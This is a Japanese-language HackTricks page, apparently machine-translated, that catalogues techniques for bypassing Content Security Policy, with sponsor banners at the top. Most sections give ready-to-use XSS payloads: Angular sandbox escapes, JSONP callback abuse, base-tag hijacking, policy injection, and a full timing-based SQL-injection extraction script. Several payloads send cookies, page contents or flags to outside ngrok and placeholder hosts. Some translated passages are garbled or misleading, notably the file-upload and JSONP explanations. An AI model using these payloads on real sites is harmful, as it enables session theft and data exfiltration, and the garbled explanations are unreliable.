# コンテンツセキュリティポリシー（CSP）バイパス

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofはすべての暗号バグバウンティの場所です。**

**遅延なしで報酬を受け取る**\
HackenProofのバウンティは、顧客が報酬予算を入金した後にのみ開始されます。バグが検証された後に報酬を受け取ることができます。

**Web3ペンテストの経験を積む**\
ブロックチェーンプロトコルとスマートコントラクトは新しいインターネットです！上昇期のweb3セキュリティをマスターしましょう。

**Web3ハッカーレジェンドになる**\
各検証済みのバグごとに評判ポイントを獲得し、週間リーダーボードのトップを制覇しましょう。

[**HackenProofでサインアップ**](https://hackenproof.com/register)して、ハッキングから報酬を得ましょう！

{% embed url="https://hackenproof.com/register" %}

## CSPとは

コンテンツセキュリティポリシー（Content Security PolicyまたはCSP）は、**クロスサイトスクリプティング（XSS）などの攻撃から保護するための組み込みブラウザ技術**です。ブラウザが安全にリソースを読み込み、実行できるパスとソースをリスト化および説明します。リソースには、画像、フレーム、JavaScriptなどが含まれる場合があります。以下は、ローカルドメイン（self）からのリソースをインラインで読み込み、実行することを許可する例です。また、`eval`、`setTimeout`、`setInterval`などの文字列コード実行関数も許可されます。

コンテンツセキュリティポリシーは、**レスポンスヘッダ**または**HTMLページのメタ要素**を介して実装されます。ブラウザは受信したポリシーに従い、違反が検出されると積極的にブロックします。

レスポンスヘッダを介して実装されます：
```http
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
メタタグを使用して実装されます：
```markup
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### ヘッダー

* `Content-Security-Policy`
* `Content-Security-Policy-Report-Only` これは何もブロックせず、レポートのみを送信します（Pre環境で使用）。

## リソースの定義

CSPは、アクティブおよびパッシブコンテンツが読み込まれる元の制限によって機能します。また、インラインのJavaScriptの実行や`eval()`の使用など、アクティブコンテンツの特定の側面を制限することもできます。
```
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### ディレクティブ

* **script-src**: このディレクティブはJavaScriptの許可されたソースを指定します。これには、要素に直接ロードされるURLだけでなく、インラインスクリプトイベントハンドラ（onclick）やスクリプトの実行をトリガーすることができるXSLTスタイルシートも含まれます。
* **default-src**: このディレクティブは、デフォルトでリソースを取得するためのポリシーを定義します。CSPヘッダーにフェッチディレクティブが存在しない場合、ブラウザはデフォルトでこのディレクティブに従います。
* **Child-src**: このディレクティブは、Webワーカーや埋め込みフレームのコンテンツに許可されたリソースを定義します。
* **connect-src**: このディレクティブは、fetch、websocket、XMLHttpRequestなどのインターフェースを使用してロードするURLを制限します。
* **frame-src**: このディレクティブは、呼び出すことができるフレームのURLを制限します。
* **frame-ancestors**: このディレクティブは、現在のページを埋め込むことができるソースを指定します。このディレクティブは[`<frame>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame)、[`<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe)、[`<object>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object)、[`<embed>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed)、または[`<applet>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet)に適用されます。このディレクティブはタグ内では使用できず、非HTMLリソースにのみ適用されます。
* **img-src**: これはウェブページで画像をロードするための許可されたソースを定義します。
* **font-src:** このディレクティブは、`@font-face`を使用してロードされるフォントの有効なソースを指定します。
* **manifest-src**: このディレクティブは、アプリケーションマニフェストファイルの許可されたソースを定義します。
* **media-src**: これはメディアオブジェクトをロードするための許可されたソースを定義します。
* **object-src**: これは\<object>、\<embed>、および\<applet>要素の許可されたソースを定義します。
* **base-uri**: これは要素を使用してロードできる許可されたURLを定義します。
* **form-action**: このディレクティブは、タグからの送信のための有効なエンドポイントをリストします。
* **plugin-types**: これはページが呼び出すことができるMIMEタイプの種類を制限します。
* **upgrade-insecure-requests**: このディレクティブは、URLスキームを書き換えてHTTPをHTTPSに変更するようブラウザに指示します。このディレクティブは、大量の古いURLを書き換える必要があるウェブサイトに便利です。
* **sandbox**: sandboxディレクティブは、リクエストされたリソースに対してsandbox属性と同様の制限を適用します。これにより、ポップアップの防止、プラグインとスクリプトの実行の防止、同一オリジンポリシーの強制など、ページのアクションが制限されます。

### **ソース**

* \*: これは`data:`、`blob:`、`filesystem:`スキーム以外の任意のURLを許可します。
* **self**: このソースは、ページ上のリソースのロードが同じドメインから許可されていることを定義します。
* **data**: このソースは、データスキームを介してリソースをロードすることを許可します（例：Base64エンコードされた画像）。
* **none**: このディレクティブは、どのソースからも何もロードできないようにします。
* **unsafe-eval**: これはeval（）や類似のメソッドを使用して文字列からコードを作成することを許可します。これは安全なプラクティスではないため、このソースを任意のディレクティブに含めることは推奨されません。同じ理由で、unsafeという名前が付けられています。
* **unsafe-hashes**: これにより、特定のインラインイベントハンドラの有効化が可能になります。
* **unsafe-inline**: これにより、インラインリソース（インライン要素、javascript：URL、インラインイベントハンドラ、インライン要素など）の使用が許可されます。セキュリティ上の理由から、これは推奨されません。
* **nonce**: 暗号化されたnonce（一度だけ使用される数値）を使用して特定のインラインスクリプトをホワイトリストに登録します。サーバーは、ポリシーを送信するたびに一意のnonce値を生成する必要があります。
* **sha256-\<hash>**: 特定のsha256ハッシュを持つスクリプトをホワイトリストに登録します。
* **strict-dynamic**: これにより、以前に「nonce」または「hash」値によってホワイトリストに登録されたスクリプトソースから、ブラウザがDOM内で新しいJavaScriptタグをロードおよび実行できるようになります。
* **host**: example.comなどのホストを示します。

## 危険なCSPルール

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
動作するペイロード：`"/><script>alert(1);</script>`

#### Iframesを使用したself + 'unsafe-inline'

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
動作するペイロード：
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

もし何らかの方法で、許可されたJSコードが新しいスクリプトタグをDOMに作成することができれば、許可されたスクリプトがそれを作成しているため、**新しいスクリプトタグは実行が許可されます**。

### ワイルドカード (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
動作するペイロード：
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### object-srcとdefault-srcの不足

{% hint style="danger" %}
**これはもう機能しないようです**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
動作するペイロード：
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### ファイルのアップロード + 'self'

このテクニックは、Content Security Policy（CSP）によって保護されたウェブアプリケーションでファイルのアップロードをバイパスする方法です。CSPは、ウェブアプリケーションのセキュリティを強化するために使用されるヘッダーです。CSPでは、許可されたソースからのみリソースの読み込みや実行が許可されます。

通常、CSPでは、`self`ディレクティブを使用して、同じオリジンからのみリソースの読み込みや実行を許可します。しかし、このテクニックでは、`self`ディレクティブをバイパスすることができます。

攻撃者は、ファイルのアップロード機能を使用して、自身のコードを実行することができます。これにより、攻撃者はウェブアプリケーション内で任意の操作を実行することができます。

このテクニックを実行するためには、以下の手順を実行します。

1. 攻撃者は、ファイルのアップロード機能を見つけます。
2. 攻撃者は、アップロードされたファイルに自身のコードを埋め込みます。
3. 攻撃者は、CSPヘッダーをバイパスするために、`self`ディレクティブを使用します。
4. 攻撃者は、アップロードされたファイルを実行することで、攻撃を実行します。

このテクニックを防ぐためには、以下の対策を実施する必要があります。

- ファイルのアップロード機能に対して適切な入力検証を実施する。
- CSPヘッダーを正しく設定し、`self`ディレクティブを使用する。
- セキュリティパッチやアップデートを定期的に適用する。

このテクニックは、CSPのバイパスによってファイルのアップロードを悪用する攻撃手法です。ウェブアプリケーションのセキュリティを向上させるために、開発者やセキュリティチームはこのテクニックに対する対策を講じる必要があります。
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
もしJSファイルをアップロードできるなら、このCSPをバイパスすることができます：

動作するペイロード：
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
しかし、サーバーが**アップロードされたファイルを検証**し、**特定の種類のファイルのみをアップロード**できるようにしている可能性が非常に高いです。

さらに、サーバーが受け入れる拡張子（例：_script.png_のような）を使用してファイル内に**JSコードをアップロード**できたとしても、これだけでは十分ではありません。なぜなら、Apacheサーバーのような一部のサーバーは、拡張子に基づいてファイルのMIMEタイプを**選択**し、Chromeのようなブラウザは、画像であるべきもの内部のJavascriptコードの実行を**拒否**するからです。"幸いなことに"、ここにはミスがあります。たとえば、CTFから学んだように、**Apacheは**_**.wave**_**拡張子を認識しない**ため、**audio/\***のようなMIMEタイプで提供しません。

ここから、XSSとファイルのアップロードを見つけ、**誤解された拡張子**を見つけることができれば、その拡張子を持つファイルとスクリプトの内容をアップロードしてみることができます。または、サーバーがアップロードされたファイルの正しい形式をチェックしている場合は、ポリグロット（[ここにいくつかのポリグロットの例があります](https://github.com/Polydet/polyglot-database)）を作成してみてください。

### サードパーティのエンドポイント + ('unsafe-eval')

{% hint style="warning" %}
以下のペイロードの一部には、**`unsafe-eval`は必要ありません**。
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
脆弱性のあるバージョンのAngularを読み込み、任意のJavaScriptを実行します:

```html
<script src="https://example.com/angular/vulnerable-version.js"></script>
```

This will load the vulnerable version of Angular from the specified URL and execute any arbitrary JavaScript code contained within it.

これにより、指定されたURLから脆弱性のあるAngularのバージョンが読み込まれ、それに含まれる任意のJavaScriptコードが実行されます。
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Angular + `window`オブジェクトを返す関数を持つライブラリを使用したペイロード（[この投稿をチェックしてください](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)）：

{% hint style="info" %}
この投稿では、`cdn.cloudflare.com`（または他の許可されたJSライブラリのリポジトリ）からすべてのライブラリを**ロード**し、各ライブラリから追加されたすべての関数を実行し、**どの関数がどのライブラリから`window`オブジェクトを返すか**を確認できることを示しています。
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>



```
#### Google reCAPTCHA JSコードの悪用

[**このCTFの解説記事**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=ja&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves)によると、CSP内で[https://www.google.com/recaptcha/](https://www.google.com/recaptcha/)を悪用してCSPをバイパスし、任意のJSコードを実行することができるとのことです。
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### サードパーティのエンドポイント + JSONP

JSONP（JSON with Padding）は、クロスドメインリクエストを実現するための一般的な手法です。これは、ウェブアプリケーションが異なるドメインのサードパーティエンドポイントにアクセスするために使用されます。

JSONPは、スクリプトタグを使用して外部スクリプトを読み込むことによって機能します。ウェブアプリケーションは、サードパーティのエンドポイントに対してスクリプトタグを生成し、コールバック関数を指定します。サードパーティのエンドポイントは、指定されたコールバック関数を含むJSONデータを返します。ウェブアプリケーションは、コールバック関数を使用してJSONデータを処理します。

この手法は、Content Security Policy（CSP）によって制限されている場合に有用です。CSPは、ウェブアプリケーションが信頼されたリソースからのみリソースを読み込むことを制限するために使用されます。しかし、JSONPはスクリプトタグを使用して外部リソースを読み込むため、CSPの制限を回避することができます。

JSONPを使用してCSPをバイパスするには、以下の手順に従います。

1. ウェブアプリケーションでサードパーティのエンドポイントに対してスクリプトタグを生成します。
2. スクリプトタグのsrc属性には、サードパーティのエンドポイントのURLを指定します。
3. コールバック関数を指定するために、URLのクエリパラメータとしてコールバック関数の名前を追加します。
4. サードパーティのエンドポイントは、指定されたコールバック関数を含むJSONデータを返します。
5. ウェブアプリケーションは、コールバック関数を使用してJSONデータを処理します。

JSONPを使用してCSPをバイパスすることで、ウェブアプリケーションは制限された環境でサードパーティのエンドポイントにアクセスできるようになります。ただし、JSONPはセキュリティ上のリスクを伴うため、慎重に使用する必要があります。
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
以下のようなシナリオでは、`script-src`が`self`と特定のドメインに設定されている場合、JSONPを使用して回避することができます。 JSONPエンドポイントは、安全でないコールバックメソッドを許可するため、攻撃者はXSSを実行することができます。有効なペイロードは以下の通りです：
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **には、さまざまなウェブサイトのCSPバイパスに使用できるJSONPエンドポイントが含まれています。**

同じ脆弱性は、**信頼されたエンドポイントにオープンリダイレクトが含まれている場合にも発生します**。なぜなら、初期のエンドポイントが信頼されている場合、リダイレクトも信頼されるからです。

### フォルダパスバイパス

CSPポリシーがフォルダを指す場合、**"/"**をエンコードするために**%2f**を使用しても、それはまだフォルダ内にあると見なされます。すべてのブラウザがこれに同意しているようです。\
これにより、サーバーがデコードする場合には、**%2f..%2f**を使用してバイパスすることができます。たとえば、CSPが`http://example.com/company/`を許可している場合、フォルダの制限をバイパスして次のコードを実行できます：`http://example.com/company%2f..%2fattacker/file.js`

オンラインの例：[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### IframesによるJSの実行

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### **base-uri**の不足

**base-uri**ディレクティブが不足している場合、[**dangling markup injection**](../dangling-markup-html-scriptless-injection/)を実行するために悪用することができます。

さらに、脆弱なページが相対パス（例：`/js/app.js`）を使用してスクリプトをロードしている場合、**Nonce**を使用して、**base** **tag**を悪用してスクリプトを**自分のサーバーからロードし、XSSを達成**することができます。\
脆弱なページがhttpSで読み込まれる場合は、baseでhttpSのURLを使用してください。
```html
<base href="https://www.attacker.com/">
```
### AngularJS イベント

特定のポリシーによって、CSPはJavaScriptイベントをブロックする場合があります。しかし、AngularJSは代わりに使用できる独自のイベントを定義しています。イベント内部では、AngularJSは`$event`という特別なオブジェクトを定義しており、これは単純にブラウザのイベントオブジェクトを参照します。このオブジェクトを使用してCSPをバイパスすることができます。Chromeでは、`$event/event`オブジェクトには`path`という特別なプロパティがあります。このプロパティには、イベントの実行を引き起こすオブジェクトの配列が含まれています。最後のプロパティは常に`window`オブジェクトであり、これを使用してサンドボックスを脱出することができます。この配列を`orderBy`フィルタに渡すことで、配列を列挙し、最後の要素（`window`オブジェクト）を使用して`alert()`などのグローバル関数を実行することができます。以下のコードはこれを示しています：
```markup
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
**他のAngularバイパスを**[**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) **で見つける**

### AngularJSとホワイトリストに登録されたドメイン
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
もしアプリケーションがAngular JSを使用しており、スクリプトがホワイトリストに登録されたドメインからロードされている場合、コールバック関数と脆弱性のあるクラスを呼び出すことで、このCSPポリシーをバイパスすることが可能です。詳細については、この素晴らしい[git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22)リポジトリをご覧ください。

動作するペイロード：
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
他のJSONP任意実行エンドポイントは[**こちら**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)で見つけることができます（一部は削除または修正されました）。

### ダングリングマークアップを使用してCSPをバイパスする

[こちら](../dangling-markup-html-scriptless-injection/)で詳細を読む。

### 'unsafe-inline'; img-src \*; によるXSS経由
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'`は、コード内で任意のスクリプトを実行できることを意味します（XSSはコードを実行できます）。また、`img-src *`は、ウェブページで任意のリソースからの画像を使用できることを意味します。

このCSPをバイパスする方法は、画像を介してデータを外部に漏洩させることです（この場合、XSSはボットによってアクセス可能なページでCSRFを悪用し、SQLiを含んだフラグを画像を通じて抽出します）。
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

この設定を悪用して、**画像内に挿入されたJavaScriptコードを読み込む**こともできます。たとえば、ページがTwitterから画像を読み込むことを許可している場合、**特別な画像**を作成し、Twitterに**アップロード**して、"**unsafe-inline**"を悪用して通常のXSSとしてJSコードを**実行**し、**画像**からJSを**抽出**して**実行**することができます：[https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### サービスワーカーを使用する場合

サービスワーカーの**`importScripts`**関数はCSPの制限を受けません：

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### ポリシーインジェクション

**研究:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

あなたが送信した**パラメータ**が**ポリシー**の**宣言**内に**貼り付けられている**場合、**ポリシー**を無効にするような方法で**ポリシー**を**変更**することができます。以下のいずれかのバイパスを使用して、スクリプト 'unsafe-inline' を許可することができます：
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
このディレクティブは、既存のscript-srcディレクティブを上書きします。\
ここに例があります：[http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Edgeでは、CSPにこれだけ追加できれば、**`;_`** Edgeは**ポリシー全体を無効化**します。\
例：[http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*;によるXSS（iframe）- タイムアタック

ディレクティブ`'unsafe-inline'`が欠落していることに注意してください。\
今回は、`<iframe`を使用して被害者に**あなたの制御下のページ**を**読み込ませる**ことができます。今回は被害者に情報（**CSRF**）を抽出したいページにアクセスさせます。ページの内容にはアクセスできませんが、ページの読み込みにかかる時間を**制御できる**場合、必要な情報を抽出することができます。

今回は、**フラグ**が抽出されます。SQLiによって**文字が正しく推測**されるたびに、**応答**が**スリープ関数**のためにより長くなります。その後、フラグを抽出できます。
```javascript
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org";
function gen(x) {
x = escape(x.replace(/_/g, '\\_'));
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`;
}

function gen2(x) {
x = escape(x);
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`;
}

async function query(word, end=false) {
let h = performance.now();
f.location = (end ? gen2(word) : gen(word));
await new Promise(r => {
g.onload = r;
});
let diff = performance.now() - h;
return diff > 300;
}

let alphabet = '_abcdefghijklmnopqrstuvwxyz0123456789'.split('');
let postfix = '}'

async function run() {
let prefix = 'nn9ed{';
while (true) {
let i = 0;
for (i;i<alphabet.length;i++) {
let c = alphabet[i];
let t =  await query(prefix+c); // Check what chars returns TRUE or FALSE
console.log(prefix, c, t);
if (t) {
console.log('FOUND!')
prefix += c;
break;
}
}
if (i==alphabet.length) {
console.log('missing chars');
break;
}
let t = await query(prefix+'}', true);
if (t) {
prefix += '}';
break;
}
}
new Image().src = 'http://PLAYER_SERVER/?' + prefix; //Exfiltrate the flag
console.log(prefix);
}

run();
</script>
```
### ブックマークレットを介した攻撃

この攻撃では、攻撃者がユーザーに対して、ブラウザのブックマークレットにリンクをドラッグアンドドロップするように説得します。このブックマークレットには、悪意のあるJavaScriptコードが含まれており、ドラッグアンドドロップまたはクリックされると、現在のウェブウィンドウのコンテキストで実行され、CSPをバイパスしてクッキーやトークンなどの機密情報を盗むことができます。

詳細については、[**こちらの元のレポートをご覧ください**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/)。

### CSPの制限によるCSPバイパス

[**このCTFの解説記事**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution)では、CSPがバイパスされ、許可されたiframe内により制限の厳しいCSPが注入され、特定のJSファイルの読み込みが禁止され、その後、**プロトタイプ汚染**または**DOMクロバリング**を介して、異なるスクリプトを悪用して任意のスクリプトを読み込むことができます。

IframeのCSPを**`csp`**属性で制限することができます：

{% code overflow="wrap" %}
```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
{% endcode %}

[**このCTFの解説記事**](https://github.com/aszx87410/ctf-writeups/issues/48)では、**HTMLインジェクション**を使用して、**CSP**をより**制限**することができ、CSTIを防ぐスクリプトが無効化され、その結果、**脆弱性が悪用可能になりました。**
CSPは、**HTMLメタタグ**を使用してより制限的にすることができ、インラインスクリプトは**エントリを削除**することで無効化できます。また、**nonce**を許可することで特定のインラインスクリプトを有効にすることもできます。
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';">
```
### Content-Security-Policy-Report-Onlyを使用したJSデータの外部流出

もしサーバーが**`Content-Security-Policy-Report-Only`**ヘッダーを**あなたが制御できる値**で応答するようにできれば（おそらくCRLFのため）、それをあなたのサーバーに向けさせることができます。そして、外部流出したい**JSコンテンツ**を**`<script>`**で囲むことができます。CSPではおそらく`unsafe-inline`は許可されていないため、これによりCSPエラーが発生し、（機密情報を含む）スクリプトの一部が`Content-Security-Policy-Report-Only`からサーバーに送信されます。

例として、[**このCTFの解説を参照してください**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes)。

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector('DIV').innerHTML="<iframe src='javascript:var s = document.createElement(\"script\");s.src = \"https://pastebin.com/raw/dw5cWGK6\";document.body.appendChild(s);'></iframe>";
```
### 情報の漏洩 CSP + Iframe

ユーザーによって異なる秘密のあるページにリダイレクトする**ページがある状況を想像してみてください**。例えば、ユーザー**admin**が**redirectme.domain1.com**にアクセスすると、**adminsecret321.domain2.com**にリダイレクトされ、adminにXSSを引き起こすことができます。\
**また、リダイレクトされるページはセキュリティポリシーによって許可されていませんが、リダイレクトするページは許可されています。**

管理者がリダイレクトされるドメインを以下の方法で漏洩することができます：

* **CSP違反を通じて**
* **CSPルールを通じて**

CSP違反は即座に漏洩します。`https://redirectme.domain1.com`を指すiframeを読み込み、`securitypolicyviolation`イベントを監視します。このイベントには、ブロックされたURIのドメインを含む`blockedURI`プロパティが含まれています。これは、CSPによってブロックされる`https://adminsecret321.domain2.com`にリダイレクトされるためです（CSPによってブロックされます）。これは、CSPでiframeをどのように処理するかに関する未定義の動作を利用しています。ChromeとFirefoxはこれに関して異なる動作をします。

秘密のサブドメインを構成する可能性のある文字を知っている場合、CSPがリソースをブロックした時としなかった時を確認するために、バイナリサーチを使用して異なる禁止ドメインをCSPに作成することもできます（この場合、秘密は`doc-X-XXXX.secdrivencontent.dev`の形式である可能性があります）。
```
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
トリックは[**ここ**](https://ctftime.org/writeup/29310)から。

